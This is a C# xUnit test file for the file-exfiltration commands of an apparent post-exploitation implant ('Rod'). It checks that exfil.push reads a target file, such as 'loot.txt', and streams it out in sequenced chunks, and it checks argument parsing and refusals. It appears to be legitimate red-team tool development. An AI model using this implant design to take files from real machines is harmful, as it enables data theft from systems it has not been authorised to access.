using System.Text;
using Rod.Implant.Internal;
using Rod.V1;

namespace Rod.Implant.Tests;

// ExfilTests ports exfil_test.go from the Go reference implant to xUnit,
// covering the exfil.* dispatch surface: argument parsing, the name-only staging
// path, the read/stream path, the missing-file and directory refusals, chunk
// terminal-flag correctness, and the exfil.stage manifest.
public class ExfilTests
{
    private static Runner NewRunner() => new();

    [Fact]
    public void ExfilPush_EmptyArgs_FailsWithCause()
    {
        var runner = NewRunner();
        var (outcome, output, chunks) = runner.Dispatch("exfil.push", "");
        Assert.Equal(TaskOutcome.Failed, outcome);
        Assert.Contains("exfil.push expects", output);
        Assert.Empty(chunks);
    }

    [Fact]
    public void ExfilPush_NameOnly_StagedManifest()
    {
        var runner = NewRunner();
        var (outcome, output, chunks) = runner.Dispatch("exfil.push", " loot.tar.gz");
        Assert.Equal(TaskOutcome.Succeeded, outcome);
        Assert.Contains("staged loot.tar.gz", output);
        Assert.Empty(chunks);
    }

    [Fact]
    public void ExfilPush_MissingFile_FailsWithCause()
    {
        var runner = NewRunner();
        using var dir = TempDir.Create();
        var (outcome, output, _) = runner.Dispatch(
            "exfil.push", "absent " + Path.Combine(dir.Path, "missing"));
        Assert.Equal(TaskOutcome.Failed, outcome);
        Assert.Contains("stat ", output);
    }

    [Fact]
    public void ExfilPush_Directory_RefusesWithCause()
    {
        var runner = NewRunner();
        using var dir = TempDir.Create();
        var (outcome, output, _) = runner.Dispatch("exfil.push", "dir " + dir.Path);
        Assert.Equal(TaskOutcome.Failed, outcome);
        Assert.Contains("directory", output);
    }

    [Fact]
    public void ExfilPush_StreamsFileContents()
    {
        var runner = NewRunner();
        using var dir = TempDir.Create();
        var path = Path.Combine(dir.Path, "loot.txt");
        const string want = "exfil payload line one\nline two\n";
        File.WriteAllBytes(path, Encoding.UTF8.GetBytes(want));

        var (outcome, output, chunks) = runner.Dispatch("exfil.push", "loot.txt " + path);
        Assert.Equal(TaskOutcome.Succeeded, outcome);
        Assert.Contains("pushed loot.txt", output);
        var c = Assert.Single(chunks);
        Assert.Equal("loot.txt", c.Name);
        Assert.Equal("text/plain", c.ContentType);
        Assert.True(c.Terminal);
        Assert.Equal(want, Encoding.UTF8.GetString(c.Data.ToByteArray()));
    }

    [Fact]
    public void ExfilPush_LargeFile_MultiChunkTerminal()
    {
        var runner = NewRunner();
        using var dir = TempDir.Create();
        var path = Path.Combine(dir.Path, "blob.bin");
        const int chunkSize = 512 * 1024;
        var payload = new byte[chunkSize * 2 + 1024];
        for (var i = 0; i < payload.Length; i++)
            payload[i] = (byte)(i % 251);
        File.WriteAllBytes(path, payload);

        var (outcome, _, chunks) = runner.Dispatch("exfil.push", "blob.bin " + path);
        Assert.Equal(TaskOutcome.Succeeded, outcome);
        Assert.True(chunks.Count >= 3, $"want >= 3 chunks, got {chunks.Count}");
        Assert.False(chunks[0].Terminal);

        var reassembled = new List<byte>();
        for (var i = 0; i < chunks.Count; i++)
        {
            Assert.Equal((ulong)(i + 1), chunks[i].Sequence);
            reassembled.AddRange(chunks[i].Data.ToByteArray());
        }
        Assert.True(chunks[^1].Terminal, "last chunk should be terminal");
        Assert.Equal(payload, reassembled.ToArray());
    }

    [Fact]
    public void ExfilStage_ReportsEmptyManifest()
    {
        var runner = NewRunner();
        var (outcome, output, chunks) = runner.Dispatch("exfil.stage", "");
        Assert.Equal(TaskOutcome.Succeeded, outcome);
        Assert.Contains("no local staging area", output);
        Assert.Empty(chunks);
    }

    [Theory]
    [InlineData("", "", "", false)]
    [InlineData("   ", "", "", false)]
    [InlineData("name", "name", "", true)]
    [InlineData("  name  ", "name", "", true)]
    [InlineData("name /tmp/file", "name", "/tmp/file", true)]
    [InlineData("name /tmp/with space.txt", "name", "/tmp/with space.txt", true)]
    public void TryParsePushArgs_Routes_Name_And_Path(
        string input, string wantName, string wantPath, bool ok)
    {
        var result = Exfil.TryParsePushArgs(input, out var name, out var path);
        Assert.Equal(ok, result);
        Assert.Equal(wantName, name);
        Assert.Equal(wantPath, path);
    }

    [Theory]
    [InlineData(".txt", "text/plain")]
    [InlineData(".log", "text/plain")]
    [InlineData(".json", "application/json")]
    [InlineData(".xml", "application/xml")]
    [InlineData(".csv", "text/csv")]
    [InlineData(".html", "text/html")]
    [InlineData(".htm", "text/html")]
    [InlineData(".png", "image/png")]
    [InlineData(".jpeg", "image/jpeg")]
    [InlineData(".pdf", "application/pdf")]
    [InlineData(".bin", "application/octet-stream")]
    [InlineData("", "application/octet-stream")]
    public void SniffContentType_Returns_Expected_Mime(string ext, string want)
    {
        Assert.Equal(want, Exfil.SniffContentType("file" + ext));
    }
}
